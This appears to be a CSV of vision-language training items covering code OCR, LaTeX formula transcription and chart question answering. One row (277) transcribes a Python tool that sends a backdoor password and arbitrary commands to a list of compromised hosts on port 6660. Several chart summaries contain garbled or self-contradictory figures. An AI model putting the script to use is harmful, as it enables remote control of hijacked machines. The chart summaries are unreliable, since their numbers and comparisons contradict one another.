original_id,category,subset,user,assistant,x_position,y_position
273,Naive OCR,SynthCodeNet,Convert code to text.,"<code><loc_0><loc_0><loc_500><loc_500><_JavaScript_>'use strict'
let input = require(""fs"").readFileSync(""/dev/stdin"", ""utf8"");
let Nums = input.split("" "");
let A = Nums[0]*1;
let B = Nums[1]*1;
let C = Nums[2]*1;
let D = Nums[3]*1;
let ans = 0;
for(let i = A; i <= B; i++){
  if( (i % C != 0) && (i % D != 0) ){
    ans++;
  }
}
console.log(ans);</code>",-0.11364583,17.126024
274,Naive OCR,SynthCodeNet,Convert code to text.,"<code><loc_0><loc_0><loc_500><loc_500><_Python_>from django.contrib import admin

from .models import Question
from .models import Choice
from .models import Contact
#https://www.djangosnippets.org/snippets/934/
#http://www.psychicorigami.com/2009/06/20/django-simple-admin-imagefield-thumbnail/
#https://docs.djangoproject.com/es/1.10/ref/contrib/admin/actions/

class ChoiceInline(admin.StackedInline):
    model = Choice
    extra = 3

@admin.register(Question)
class QuestionAdmin(admin.ModelAdmin):
    fieldsets = [
        (None,               {'fields': ['question_text']}),
        ('Date information', {'fields': ['pub_date'], 'classes': ['collapse']}),
    ]
    inlines = [ChoiceInline]

from .image_widget import AdminImageWidget
from django import forms

# class FileUploadForm(forms.ModelForm):
#     upload = forms.FileField(widget=AdminImageWidget)
#     class Meta:
#         model = Contact
#         fields = '__all__'
class FileUploadAdmin(admin.ModelAdmin):
    # form = FileUploadForm
    def formfield_for_dbfield(self, db_field, **kwargs):
        if db_field.name == 'photo':
            request = kwargs.pop(""request"", None)
            kwargs['widget'] = AdminImageWidget
            return db_field.formfield(**kwargs)
        return super(FileUploadAdmin,self).formfield_for_dbfield(db_field, **kwargs)

admin.site.register(Contact, FileUploadAdmin)

# class AdminImageWidget(AdminFileWidget):
#     def render(self, name, value, attrs=None):
#         output = []
#         if value and getattr(value, ""url"", None):
#             image_url = '../media/'+ value.url
#             file_name=str(value)
#             output.append(u' <a href=""%s"" target=""_blank""><img src=""%s"" alt=""%s"" /></a> %s ' % \
#                 (image_url, image_url, file_name, _('Change:')))</code>",-0.34699938,17.888674
275,Naive OCR,SynthCodeNet,Convert code to text.,"<code><loc_0><loc_0><loc_500><loc_500><_C++_>#include<bits/stdc++.h>
#include<tr1/unordered_map>
#define pb push_back
#define pii pair<int,int>
#define SZ(x) (int)x.size()
#define mem(a,b) memset(a,b,sizeof(a))
#define  For(i,a,b) for(int i=a,i##E=b;i<=i##E;++i)
#define rFor(i,a,b) for(int i=a,i##E=b;i>=i##E;--i)
typedef long long LL;
using namespace std;
const int N=100010;
template<typename T>inline bool chkmin(T &a,const T &b){return a>b?a=b,1:0;}
template<typename T>inline bool chkmax(T &a,const T &b){return a<b?a=b,1:0;}
template<typename T>inline void read(T &x)
{
	x=0;int _f(0);char ch=getchar();
	while(!isdigit(ch))_f|=(ch=='-'),ch=getchar();
	while( isdigit(ch))x=x*10+ch-'0',ch=getchar();
	x=_f?-x:x;
}
inline void file()
{
#ifdef ztzshiwo
	freopen(""in.txt"",""r"",stdin);
	freopen(""out.txt"",""w"",stdout);
#endif
}
int S[N],n,ans;
int main()
{
	int x;
	file();
	read(n);
	For(i,1,n)read(x),S[x]++;
	For(i,1,N-10)chkmax(ans,S[i-1]+S[i]+S[i+1]);
	printf(""%d\n"",ans);
	return 0;
}
</code>",-0.015610901,17.330435
276,Naive OCR,SynthCodeNet,<code>,"<loc_0><loc_0><loc_500><loc_500><_Kotlin_>private fun readInts() = readLine()!!.split("" "").map { it.toInt() }.toList()

fun main(args: Array<String>) {
    val N = readInts()[0]
    val set = (1 until 10).map { it * 111 }.sorted().filter { N <= it }
    println(set.min())
}</code>",-3.8931282,15.892088
277,Naive OCR,SynthCodeNet,<code>,"<loc_0><loc_0><loc_500><loc_500><_Python_>#!/usr/bin/python
# by amon (amon@nandynarwhals.org)

import socket
import argparse
import sys
from threading import Thread
from Queue import Queue

def pwn(i):
    try:
        sys.stdout.write(""Working on %s\n""  % i)
        s = socket.socket()
        s.settimeout(10)
        s.connect((i, 6660))
        s.send(""OneBigRoomFullofBadBitches:::"" + cmd + ""\n"")
        s.close()
        sys.stdout.write(""%s: cmd sent successfully\n"" % i)
    except:
        sys.stdout.write(""%s: cmd failed to send\n"" % i)

def do_pwn(q):
    while True:
        pwn(q.get())
        q.task_done()

parser = argparse.ArgumentParser(description='Pwn some bitches.')
parser.add_argument('host', help='list of compromised hosts')
args = parser.parse_args()

hosts = file(args.host).read().strip().split(""\n"")
cmd = sys.stdin.readline().strip()

q = Queue(maxsize=0)</code>",-0.08240982,17.493
278,Naive OCR,SynthFormulaNet,<formula>,<loc_0><loc_0><loc_500><loc_500>\begin{bmatrix} 0 & 1 & 0 & \hdots & 0 \\ 0 & 0 & 1 & \hdots & 0 \\ \vdots & \vdots & \vdots & \ddots & \vdots \\ 0 & 0 & 0 & \hdots 1 \\ 1 & a _ { 1 } & a _ { 2 } & \hdots & a _ { 2 k - 2 } \end{bmatrix}</formula>,0.22886933,15.002758
279,Naive OCR,SynthFormulaNet,Convert formula to latex.,"<formula><loc_0><loc_0><loc_500><loc_500>V ( t ) = \frac { 1 } { 2 } \Delta ^ { 2 } + \mu \int _ { - \tau _ { 1 } ( t ) } ^ { 0 } \Delta ^ { 2 } ( t + \theta ) d \theta ,</formula>",1.7862303,14.29242
280,Naive OCR,SynthFormulaNet,<formula>,"<loc_0><loc_0><loc_500><loc_500>\left ( \frac { d t } { d \tau } \right ) ^ { 2 } T _ { B } ( t ) = \tilde { T } _ { B } ( \tau ) - \frac { c } { 1 2 } \{ t , \tau \} \, .</formula>",1.4039996,14.474301
281,Naive OCR,SynthFormulaNet,Convert formula to latex.,"<formula><loc_0><loc_0><loc_500><loc_500>\Lambda ( t ) = \int _ { 0 } ^ { t } \, \int \left [ - 2 ( t - s ) w _ { 1 } - 2 s \, w _ { 2 } + s \, w _ { 3 } \right ] \, d y \, d s .</formula>",1.7801038,14.159131
282,Naive OCR,SynthFormulaNet,Convert formula to latex.,"<formula><loc_0><loc_0><loc_500><loc_500>\left \| \partial _ { t } ^ { \ell } \nabla _ { x } ^ { k } \tilde { J } _ { 3 } ( t ) g \right \| _ { 2 } & \leq C t ^ { 1 - \ell } ( 1 + t ) ^ { - n ( \frac { 1 } { r _ { 1 } } - \frac { 1 } { 2 } ) - ( k - \tilde { k } _ { 3 } ) } \| \nabla ^ { \tilde { k } _ { 3 } } _ { x } g \| _ { r _ { 1 } } \\ & + C e ^ { - c t } t ^ { ( 1 - \ell ) - n ( \frac { 1 } { r _ { 2 } } - \frac { 1 } { 2 } ) - ( k - \tilde { k } _ { 4 } ) } \| \nabla ^ { \tilde { k } _ { 4 } } _ { x } g \| _ { r _ { 2 } } ,</formula>",2.364047,14.913048
283,Naive OCR,SynthFormulaNet,Convert formula to latex.,"<formula><loc_0><loc_0><loc_500><loc_500>\frac { \partial } { \partial u _ { j } ^ { ( n ) } } M ( { u } , \lambda ) = \left ( \Theta E _ { j j } ^ { ( n ) } \Theta ^ { - 1 } \right ) _ { + } M ( { u } , \lambda )</formula>",2.067444,13.650322
284,Naive OCR,SynthFormulaNet,<formula>,"<loc_0><loc_0><loc_500><loc_500>D = \left ( \begin{array} { c c | c c | c c } & & a _ { 1 , 3 } & & a _ { 1 , 5 } & \\ & & & a _ { 1 , 3 } & & a _ { 1 , 5 } \\ & & & & a _ { 3 , 5 } & \\ & & & & & a _ { 3 , 5 } \\ & & a _ { 3 , 5 } & & & \\ & & & a _ { 3 , 5 } & & \\ \end{array} \right ) .</formula>",-3.9578013,12.279434
285,Naive OCR,SynthFormulaNet,Convert formula to latex.,<formula><loc_0><loc_0><loc_500><loc_500>\lim s u p _ { x \to \infty } \frac { Z _ { t } ( x ) } { ( 2 \log x ) ^ { 1 / 2 } } = \left ( \frac { t } { \pi } \right ) ^ { 1 / 4 } \quad</formula>,1.2084179,14.285225
286,Naive OCR,SynthFormulaNet,<formula>,"<loc_0><loc_0><loc_500><loc_500>= { T r } \left \{ \Pi _ { \rho , \delta } \ \rho ^ { \otimes n } \right \}</formula>",1.4971747,13.390962
287,Naive OCR,SynthFormulaNet,Convert formula to latex.,<formula><loc_0><loc_0><loc_500><loc_500>\left ( \begin{array} { c } \phi ^ { \prime } _ { 1 } \\ \phi ^ { \prime } _ { 2 } \\ \phi ^ { \prime } _ { 3 } \\ \end{array} \right ) = \left ( \begin{array} { c c c } a ^ { 2 } & 2 a b & b ^ { 2 } \\ a c & b c + a d & b d \\ c ^ { 2 } & 2 c d & d ^ { 2 } \\ \end{array} \right ) \left ( \begin{array} { c } \phi _ { 1 } \\ \phi _ { 2 } \\ \phi _ { 3 } \\ \end{array} \right ) .</formula>,1.684946,14.628642
288,Naive OCR,SynthFormulaNet,<formula>,<loc_0><loc_0><loc_500><loc_500>\alpha = 0</formula>,1.3491838,13.396536
289,Naive OCR,SynthFormulaNet,<formula>,"<loc_0><loc_0><loc_500><loc_500>\varphi \colon & \xi ^ { \prime } = \lambda \xi + p ( \xi , \eta ) , \\ & \eta ^ { \prime } = \overline { \lambda } \eta + q ( \xi , \eta ) ,</formula>",1.8627237,13.770465
290,Naive OCR,SynthFormulaNet,<formula>,"<loc_0><loc_0><loc_500><loc_500>\Phi ( A _ { X } ) ( e _ { i } ) = \begin{cases} e _ { i } \wedge \nabla _ { X } & \text {if } i \in X \\ ( t _ { i } - 1 ) \nabla _ { X } \wedge \nabla _ { ^ { i } X } & \text {if } i _ { 1 } \leq i \leq i _ { r } \text { and } i \notin X \\ 0 & \text {otherwise} , \end{cases}</formula>",1.0238231,14.866128
291,Naive OCR,SynthFormulaNet,Convert formula to latex.,"<formula><loc_0><loc_0><loc_500><loc_500>\Pi _ { a b } ( E , p ) = - 4 \pi \int \frac { d ^ { 3 } k } { ( 2 \pi ) ^ { 3 } } \, n _ { b } ( \omega ) \, \frac { \sqrt { s } } { \omega } \, f _ { a b } ^ { ( c m ) } ( s )</formula>",1.364893,14.193316
292,Naive OCR,SynthFormulaNet,<formula>,"<loc_0><loc_0><loc_500><loc_500>A ( T , l ) = \int _ { 0 } ^ { l } f ( T , l ^ { \prime } ) d l ^ { \prime }</formula>",1.4466103,13.644283
293,Naive OCR,SynthFormulaNet,Convert formula to latex.,<formula><loc_0><loc_0><loc_500><loc_500>f _ { m e a n } = \frac { \sum k * a m p ( X _ { k } ) ^ { 2 } } { \sum a m p ( X _ { k } ) ^ { 2 } }</formula>,1.0992525,14.317199
294,Naive OCR,SynthFormulaNet,<formula>,"<loc_0><loc_0><loc_500><loc_500>- i v _ { g } \frac { \partial } { \partial x } \tilde { \phi } _ { R } ( x , t ) & + \delta ( x ) V \tilde { e } _ { c } ( t ) + ( \omega _ { 0 } + \Omega _ { g } ) \tilde { \phi } _ { R } ( x , t ) = i \frac { \partial } { \partial t } \tilde { \phi } _ { R } ( x , t ) , \\ + i v _ { g } \frac { \partial } { \partial x } \tilde { \phi } _ { L } ( x , t ) & + \delta ( x ) V \tilde { e } _ { c } ( t ) + ( \omega _ { 0 } + \Omega _ { g } ) \tilde { \phi } _ { L } ( x , t ) = i \frac { \partial } { \partial t } \tilde { \phi } _ { L } ( x , t ) , \\ ( \omega _ { c } - i \frac { 1 } { \tau _ { c } } ) \tilde { e } _ { c } ( t ) & + V \left ( \tilde { \phi } _ { R } ( 0 , t ) + \tilde { \phi } _ { L } ( 0 , t ) \right ) + g \tilde { e } _ { a } ( t ) + \Omega _ { g } \tilde { e } _ { c } ( t ) = i \frac { \partial } { \partial t } \tilde { e } _ { c } ( t ) , \\ ( \Omega - i \frac { 1 } { \tau _ { a } } ) \tilde { e } _ { a } ( t ) & + g \tilde { e } _ { c } ( t ) + \Omega _ { g } \tilde { e } _ { a } ( t ) = i \frac { \partial } { \partial t } \tilde { e } _ { a } ( t ) .</formula>",1.5460949,15.546643
295,Naive OCR,SynthFormulaNet,<formula>,<loc_0><loc_0><loc_500><loc_500>( \sigma _ { 1 } \frac { \partial } { \partial x _ { 0 } } + \sigma _ { 2 } \frac { \partial } { \partial x _ { 1 } } + \sigma _ { 3 } \frac { \partial } { \partial x _ { 2 } } ) ^ { 2 } = \frac { \partial ^ { 2 } } { \partial x _ { 0 } ^ { 2 } } + \frac { \partial ^ { 2 } } { \partial x _ { 1 } ^ { 2 } } + \frac { \partial ^ { 2 } } { \partial x _ { 2 } ^ { 2 } } .</formula>,1.2137767,13.969349
296,Naive OCR,SynthFormulaNet,<formula>,"<loc_0><loc_0><loc_500><loc_500>E _ { B } ( q ) = \frac { 1 } { 2 } q ^ { 2 } \pi ^ { 2 } ,</formula>",1.4102746,13.717272
297,Naive OCR,SynthFormulaNet,Convert formula to latex.,<formula><loc_0><loc_0><loc_500><loc_500>\Omega ^ { N }</formula>,0.91062367,13.0298605
298,Naive OCR,SynthFormulaNet,Convert formula to latex.,<formula><loc_0><loc_0><loc_500><loc_500>1 = ( \begin{matrix} 1 & 0 \\ 0 & 1 \end{matrix} )</formula>,1.1339371,13.871966
299,Naive OCR,SynthFormulaNet,Convert formula to latex.,<formula><loc_0><loc_0><loc_500><loc_500>\int _ { A } f \ d \mu & = \int _ { A \cap E _ { N } } f \ d \mu + \int _ { A \cap E _ { N } ^ { c } } f \ d \mu \\ & \leq \int _ { A \cap E _ { N } } ( f - N ) \ d \mu + \int _ { A \cap E _ { N } } N \ d \mu + \int _ { A \cap E _ { N } ^ { c } } N \ d \mu \\ & \leq \int _ { E _ { N } } ( f - N ) \ d \mu + \int _ { A } N \ d \mu \\ & < \frac { \ e p s } { 2 } + N \mu ( A ) < \frac { \ e p s } { 2 } + N \delta < \ e p s .</formula>,1.6997597,15.142788
300,Naive OCR,SynthFormulaNet,Convert formula to latex.,<formula><loc_0><loc_0><loc_500><loc_500>H</formula>,0.96059656,12.709436
301,Naive OCR,SynthFormulaNet,Convert formula to latex.,<formula><loc_0><loc_0><loc_500><loc_500>U _ { f } = \sqrt { \alpha g T _ { c h a r } H }</formula>,1.6072994,13.246107
302,Naive OCR,SynthFormulaNet,Convert formula to latex.,<formula><loc_0><loc_0><loc_500><loc_500>\left ( \begin{array} { c c } \eta _ { \mu \nu } \delta ^ { a b } & 0 \\ 0 & \eta _ { \mu \nu } \delta ^ { a c } \delta ^ { b d } \\ \end{array} \right )</formula>,1.1215231,13.370174
303,Naive OCR,SynthFormulaNet,<formula>,<loc_0><loc_0><loc_500><loc_500>\mu _ { p } - \mu _ { q } = 0</formula>,1.492844,13.373532
304,Naive OCR,SynthFormulaNet,<formula>,<loc_0><loc_0><loc_500><loc_500>H ( s ) = | s ^ { \ast } | = \min _ { C ( p ) = s } | p | \quad .</formula>,1.7269921,13.755263
305,Naive OCR,SynthFormulaNet,Convert formula to latex.,"<formula><loc_0><loc_0><loc_500><loc_500>\ s Q ( x , y ) = \min _ { \substack { \tilde { x } \in \mathfrak { F } ( x ) \\ \tilde { y } \in \mathfrak { F } ( y ) } } \left \{ \left ( \bar { f } ( x ) - \bar { f } ( \tilde { x } ) + \bar { g } ( y ) - \bar { g } ( \tilde { y } ) + \rho ^ { p } ( \tilde { x } , \tilde { y } ) \right ) ^ { 1 / p } \right \}</formula>",2.179824,14.5509815
306,Naive OCR,SynthFormulaNet,Convert formula to latex.,<formula><loc_0><loc_0><loc_500><loc_500>\begin{array} { r } { \left ( \begin{array} { c c c c } { H _ { 1 } + C } & { - g _ { 1 2 } \psi _ { 1 } \psi _ { 2 } ^ { * } } & { A \psi _ { 1 } ^ { 2 } } & { - g _ { 1 2 } \psi _ { 1 } \psi _ { 2 } } \\ { - g _ { 1 2 } \psi _ { 1 } ^ { * } \psi _ { 2 } } & { H _ { 2 } + C } & { - g _ { 1 2 } \psi _ { 1 } \psi _ { 2 } } & { B \psi _ { 2 } ^ { 2 } } \\ { - A \psi _ { 1 } ^ { * 2 } } & { g _ { 1 2 } \psi _ { 1 } ^ { * } \psi _ { 2 } ^ { * } } & { - H _ { 1 } - C } & { g _ { 1 2 } \psi _ { 1 } ^ { * } \psi _ { 2 } } \\ { g _ { 1 2 } \psi _ { 1 } ^ { * } \psi _ { 2 } ^ { * } } & { - B \psi _ { 2 } ^ { * 2 } } & { g _ { 1 2 } \psi _ { 1 } \psi _ { 2 } ^ { * } } & { - H _ { 2 } - C } \end{array} \right ) \left ( \begin{array} { c } { U _ { 1 } } \\ { U _ { 2 } } \\ { V _ { 1 } } \\ { V _ { 2 } } \end{array} \right ) = \Delta \left ( \begin{array} { c } { U _ { 1 } } \\ { U _ { 2 } } \\ { V _ { 1 } } \\ { V _ { 2 } } \end{array} \right ) } \end{array}</formula>,1.3578401,14.855309
307,Naive OCR,SynthFormulaNet,Convert formula to latex.,"<formula><loc_0><loc_0><loc_500><loc_500>P _ { z } = \frac { ( \Delta V - 2 \rho J z ) I } { 2 \pi \cosh ^ { - 1 } ( l / R ) } \int _ { - \tau _ { w } } ^ { \tau _ { w } } \int _ { 0 } ^ { 2 \pi } R e [ \beta ( \sigma + i \tau ) ] \, d \sigma d \tau .</formula>",1.2492148,14.366605
308,Naive OCR,SynthFormulaNet,<formula>,"<loc_0><loc_0><loc_500><loc_500>X _ { k } ^ { \prime \prime } + { \left ( \kappa ^ { 2 } + q f ^ { 2 } ( \tau ) \right ) } X _ { k } = 0 \ ,</formula>",1.9348897,13.490846
309,Naive OCR,SynthFormulaNet,<formula>,"<loc_0><loc_0><loc_500><loc_500>| \varphi _ { \pm } \rangle & = \frac { 1 } { \sqrt { 2 } } ( | \downarrow \rangle \otimes | I \rangle \pm i | \uparrow \rangle \otimes | I I \rangle ) , \\ | \phi _ { \pm } \rangle & = \frac { 1 } { \sqrt { 2 } } ( | \uparrow \rangle \otimes | I \rangle \pm i | \downarrow \rangle \otimes | I I \rangle ) ,</formula>",1.407853,14.599283
310,Naive OCR,SynthFormulaNet,Convert formula to latex.,<formula><loc_0><loc_0><loc_500><loc_500>\prod _ { r = 1 } ^ { n } x _ { r } ^ { 2 } \prod _ { l = 1 } ^ { k } c _ { l } ^ { z _ { l } } d ^ { - 1 } = 1</formula>,1.3527994,14.69017
311,Naive OCR,SynthFormulaNet,Convert formula to latex.,<formula><loc_0><loc_0><loc_500><loc_500>z</formula>,1.0525184,12.86483
312,Naive OCR,SynthFormulaNet,Convert formula to latex.,"<formula><loc_0><loc_0><loc_500><loc_500>M ( \beta _ { 0 } , h ) \ \geq \ c _ { 1 } \, h ^ { 1 / ( 1 + a ) }</formula>",1.9524969,13.247496
313,Naive OCR,SynthFormulaNet,Convert formula to latex.,<formula><loc_0><loc_0><loc_500><loc_500>\frac { 7 ( b - a ) ^ { 5 } } { 2 3 0 4 0 } f ^ { ( 4 ) } ( \xi )</formula>,1.1278163,14.295946
314,Naive OCR,SynthFormulaNet,<formula>,"<loc_0><loc_0><loc_500><loc_500>\dot { \theta } + \frac { 1 } { 2 } { \theta ^ { 2 } } + 2 ( \sigma _ { + } ^ { 2 } + \sigma _ { \times } ^ { 2 } - \omega ^ { 2 } ) + 2 \, | \Lambda | = 0 ,</formula>",2.24632,13.667028
315,Naive OCR,SynthFormulaNet,<formula>,"<loc_0><loc_0><loc_500><loc_500>r _ { N } ^ { \mu } ( t ) = \frac { 1 } { \sqrt { N \tilde { a } } } \sum _ { i = 1 } ^ { N } { \eta _ { i } ^ { \mu } ( t ) } ( \sigma _ { i } ( t ) - a ) \, , \quad \mu > 1 ,</formula>",1.5239518,14.299738
316,Naive OCR,SynthFormulaNet,<formula>,<loc_0><loc_0><loc_500><loc_500>v _ { \phi } = B J _ { 1 } ( \kappa r )</formula>,1.7567451,13.165833
317,Naive OCR,SynthFormulaNet,Convert formula to latex.,<formula><loc_0><loc_0><loc_500><loc_500>\Psi _ { \theta } ^ { \prime \prime } ( 0 ) = \frac { d \mu _ { \theta } } { d \theta } l i m _ { h \rightarrow 0 } \frac { h } { \tau }</formula>,1.140315,13.921025
318,Naive OCR,SynthFormulaNet,Convert formula to latex.,"<formula><loc_0><loc_0><loc_500><loc_500>\begin{array} { r l } { \frac { d } { d \varepsilon } \left | _ { \varepsilon = 0 } I _ { E H } [ g + \varepsilon h ] } & { = \frac { d } { d \varepsilon } \right | _ { \varepsilon = 0 } \int _ { U } R ( g + \varepsilon h ) \, v o l _ { g + \varepsilon h } } \\ & { = \int _ { U } \left \{ \left ( \frac { d } { d \varepsilon } \left | _ { \varepsilon = 0 } R ( g + \varepsilon h ) \right ) v o l _ { g } + R ( g ) \left ( \frac { d } { d \varepsilon } \right | _ { \varepsilon = 0 } v o l _ { g + \varepsilon h } \right ) \right \} } \\ & { = \int _ { U } \left \{ \left ( - \Delta h + \div ( \div h ) - \langle R i c ( g ) , h \rangle _ { g } \right ) v o l _ { g } + R ( g ) \frac { t r ( g ^ { - 1 } h ) } { 2 } v o l _ { g } \right \} } \\ & { = \int _ { U } \left ( - \Delta h + \div ( \div h ) - \langle R i c ( g ) , h \rangle _ { g } + \frac { 1 } { 2 } R ( g ) \, t r ( g ^ { - 1 } h ) \right ) v o l _ { g } . } \end{array}</formula>",1.6855685,15.429556
319,Naive OCR,SynthFormulaNet,Convert formula to latex.,<formula><loc_0><loc_0><loc_500><loc_500>\Delta _ { \delta }</formula>,1.1004134,13.143863
320,Naive OCR,SynthFormulaNet,<formula>,"<loc_0><loc_0><loc_500><loc_500>\gamma ^ { [ 1 ] } = \widehat { q } _ { 2 } \cdot \Pi ( q _ { 1 } ) \cdot \frac { v _ { 1 } } { | q _ { 1 } | } + \widehat { q } _ { 1 } \cdot \Pi ( q _ { 2 } ) \cdot \frac { v _ { 2 } } { | q _ { 2 } | } ,</formula>",1.4039396,14.001242
321,Naive OCR,SynthFormulaNet,Convert formula to latex.,<formula><loc_0><loc_0><loc_500><loc_500>c = \sum _ { g \in F } \pi ( a ( g ) ) u _ { g } .</formula>,1.4621967,14.645452
322,Naive OCR,SynthFormulaNet,<formula>,"<loc_0><loc_0><loc_500><loc_500>\begin{array} { r l } { r _ { 1 - 2 } ( \omega ) } & { = \frac { M ( 2 , 1 ) } { M ( 1 , 1 ) } } \\ & { = \frac { i \zeta _ { 1 } ( \omega ) ( 1 - i \zeta _ { 2 } ) + i \zeta _ { 2 } ( 1 + i \zeta _ { 1 } ( \omega ) ) e ^ { - i 2 \Phi } } { ( 1 - i \zeta _ { 1 } ( \omega ) ) ( 1 - i \zeta _ { 2 } ) + \zeta _ { 2 } \zeta _ { 1 } ( \omega ) e ^ { - i 2 \Phi } } , } \end{array}</formula>",1.2914104,14.500753
323,Naive OCR,SynthFormulaNet,Convert formula to latex.,"<formula><loc_0><loc_0><loc_500><loc_500>G = ( T , R ) , \\ T = ( N , \mathcal { H } , \hat { \rho } _ { i n i t } , \Omega , \{ \hat { M } _ { r } \} , \{ a _ { r } \} ) , \\ R ( T ) = ( N , \Omega , f ) .</formula>",1.8754648,14.831985
324,Naive OCR,SynthFormulaNet,Convert formula to latex.,"<formula><loc_0><loc_0><loc_500><loc_500>& \ell _ { 0 1 } = \ell _ { 0 2 } = \frac { 2 \lambda } { 1 + \lambda ^ { 2 } } \, , & \ell _ { 0 3 } = 1 \, , \\ & p _ { 0 1 } = p _ { 1 3 } = - p _ { 0 2 } = - p _ { 2 3 } = \frac { 1 - \lambda ^ { 2 } } { 1 + \lambda ^ { 2 } } \, , & p _ { 0 3 } = p _ { 1 2 } = 0 \, ,</formula>",1.6577595,15.188357
325,Naive OCR,SynthFormulaNet,Convert formula to latex.,<formula><loc_0><loc_0><loc_500><loc_500>\Lambda ^ { 3 N _ { c } - N _ { f } } = \mu ^ { N _ { c } } \Lambda _ { N = 2 } ^ { 2 N _ { c } - N _ { f } } .</formula>,1.6267941,13.784543
326,Naive OCR,SynthFormulaNet,Convert formula to latex.,"<formula><loc_0><loc_0><loc_500><loc_500>H = \sum _ { i < j } J _ { i j } s _ { i } s _ { j } ,</formula>",1.6241556,13.506343
327,Chart & Table,Unichart,What is the difference between maximum and minimum of Master Value?,1.0,-5.478337,15.044097
328,Chart & Table,Unichart,Give a concise summary of the chart's data.,"The line chart shows the number of out-of-school children of primary school age of both genders in North America from 1986 to 1992. The number of female out-of-school children decreased from 724,082 in 1986 to 565,986 in 1987, followed by a decrease to 4833,32 in 1988. The number of male out-of-school children increased from 817,065 in 1986 to 505,190 in 1992. Overall, the trend shows a decrease in the number of out-of-school children of primary school age of both genders in North America from 1986 to 1992.",-5.5799456,13.085751
329,Chart & Table,Unichart,"Which one is greater,  Tachira or  Apure?", Tachira,-5.949499,14.996578
330,Chart & Table,Unichart,Give a concise summary of the chart's data.,"The line chart shows the overall average of statistical capacity score for Mozambique and Solomon Islands from 2008 to 2012. Mozambique had an overall average of statistical capacity score of 68.89 in 2008, which increased to 72.22 in 2009 and 77.78 in 2012. Solomon Islands had an overall average of statistical capacity score of 30 in 2008, which increased to 33.33 in 2009 and 40 in 2010, before increasing to 42.22 in 2011 and 42.22 in 2012. Overall, the trend shows an overall increase in the overall average of statistical capacity score for both Mozambique and Solomon Islands from 2008 to 2012.",-5.516415,13.015133
331,Chart & Table,Unichart,Provide the raw data figures from the chart.,1.05 | 0.55 | 0.55 | 0.56 | 0.56 | 0.57 | 0.57 | 0.57 | 0.57 | 0.58 | 0.58 | 0.58 | 0.58 | 0.59 | 0.6 | 0.61 | 0.62 | 0.62 | 0.62 | 0.63 | 0.63 | 0.63 | 0.64 | 0.64 | 0.65 | 0.67 | 0.68 | 0.69 | 0.69 | 0.69 | 0.7 | 0.71 | 0.71 | 0.72 | 0.72 | 0.72 | 0.72 | 0.71 | 0.71 | 1.05 & 1.05 | 0.63 | 0.63 | 0.62 | 0.62 | 0.62 | 0.62 | 0.62 | 0.62 | 0.62 | 0.62 | 0.63 | 0.64 | 0.65 | 0.65 | 0.66 | 0.66 | 0.67 | 0.68 | 0.7 | 0.72 | 0.73 | 0.73 | 0.73 | 0.73 | 0.74 | 0.75 | 0.75 | 0.76 | 0.77 | 0.77 | 0.78 | 0.79 | 0.8 | 0.8 | 0.8 | 0.8 | 0.79 | 0.79 | 1.05,-6.098518,13.201147
332,Chart & Table,Unichart,Summarize the chart.,"The bar chart compares the number of days required to build a warehouse in Fragile and conflict affected situations, South Africa, and Tanzania between 2009 and 2013. In 2009, Fragile and conflict affected situations had the highest number of days required to build a warehouse with 202 days, followed by South Africa with 139 days and Tanzania with 205 days. By 2010, Fragile and conflict affected situations had the lowest number of days required to build a warehouse with 194 days, followed by South Africa with 139 days and Tanzania with 205 days. In 2011, Fragile and conflict affected situations had the highest number of days required to build a warehouse with 190 days, followed by South Africa with 139 days and Tanzania with 205 days. By 2012, Fragile and conflict affected situations had the highest number of days required to build a warehouse with 182 days, followed by South Africa with 139 days and Tanzania with 205 days. By 2013, Fragile and conflict affected situations had the lowest number of days required to build a warehouse with 173 days, followed by South Africa with 139 days and Tanzania with 205 days. Overall, the chart depicts a decreasing trend of the number of days required to build a warehouse in Fragile and conflict affected situations, while South Africa and Tanzania remained relatively stable.",-6.9667177,14.026482
333,Chart & Table,Unichart,In what year the gap between brown and grey become maximum?,1950.0,-6.322132,13.28759
334,Chart & Table,Unichart,What are the exact data points depicted?,0.21 | 0.61 | 0.07 | 0.12 | 0.27 | 0.03 | 0.08 | 0.07 | 0.18 | 0.44 | 0.21 | 0.45 | 0.07 | 0.14 | 0.24 | 0.05 | 0.09 | 0.02 | 0.18 | 0.86,-6.565431,15.262299
